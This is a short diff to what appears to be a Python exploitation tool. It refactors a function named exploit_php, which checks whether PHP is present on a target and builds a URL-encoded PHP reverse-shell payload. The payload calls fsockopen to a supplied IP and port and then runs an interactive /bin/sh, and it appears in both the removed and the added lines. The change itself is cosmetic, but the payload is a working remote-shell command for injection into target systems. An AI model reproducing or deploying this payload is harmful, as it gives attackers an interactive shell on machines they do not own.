@@ -1,3 +1,4 @@
+"""PHP"""
 from src.httpreqs import request
 from src.configs import config
 from src.utils.encodings import encode
@@ -8,14 +9,12 @@ from src.utils import colors
 
 
 def exploit_php(exploit, method, ip, port):
-
+    """Exploit PHP"""
     url = exploit["GETVAL"]
     post = exploit["POSTVAL"]
 
     phpTest = "which%20php"
-    phpPayload = 'php+-r+\'$sock%3dfsockopen("{0}",{1})%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b\''.format(
-        ip, str(port)
-    )
+    phpPayload = f'php+-r+\'$sock%3dfsockopen("{ip}",{port})%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b\''
 
     print(
         colors.purple("[?]") + " Checking if php is available on the target system..."
